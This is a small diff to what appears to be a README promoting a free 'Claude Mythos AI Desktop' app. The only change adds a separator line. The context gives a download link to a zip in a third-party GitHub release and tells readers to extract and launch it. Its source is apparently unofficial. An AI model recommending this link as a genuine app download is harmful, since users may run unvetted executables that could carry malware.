@@ -9,6 +9,7 @@ Use the Claude Mythos desktop app to organize demanding sessions, switch between
 ## Download Claude Mythos AI Desktop
 
 [Download `ClaudeMythos-desktop.zip`](https://github.com/claudecodemythos/Claude-Mythos-AI-Free-desktop/releases/download/mythos5/ClaudeMythos-desktop.zip)
+---
 
 After downloading, extract the archive to a new folder and launch the application for your operating system. Access requirements depend on the API or endpoint configured in the app.
 
